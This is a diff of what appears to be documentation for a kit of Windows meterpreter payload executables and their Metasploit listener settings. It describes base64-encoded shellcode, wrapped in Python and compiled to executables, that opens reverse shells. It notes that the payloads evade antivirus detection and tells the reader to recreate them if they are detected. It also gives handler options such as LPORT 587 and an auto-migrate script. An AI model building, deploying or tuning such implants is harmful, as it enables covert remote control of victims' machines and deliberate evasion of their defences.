@@ -26,12 +26,12 @@ set AutoRunScript ""
 exploit -j
 
 
-[meterpreter_inject.exe]
+[shellcode-tcp.exe]
 
 - Description: This is a windows meterpreter shell that was
                encoded into base 64, embedded into a python script
-               that preforms raw shellcode injection into explorer.exe,
-               and then compiled into an executable. It is not detected
+               that preforms shellcode execution on the system
+               and then compiled into an executable. It is not detecte
                at the time of this writing. If it is, recreate it.
 
 - This will spawn 2 meterpreter shells to the following addresses:
@@ -48,7 +48,7 @@ set LHOST 0.0.0.0
 set LPORT 587
 set ExitOnSession false
 set EXITFUNC thread
-set AutoRunScript "migrate -f"
+set AutoRunScript "migrate -f -k"
 exploit -j
 
 [powershell-https.exe]
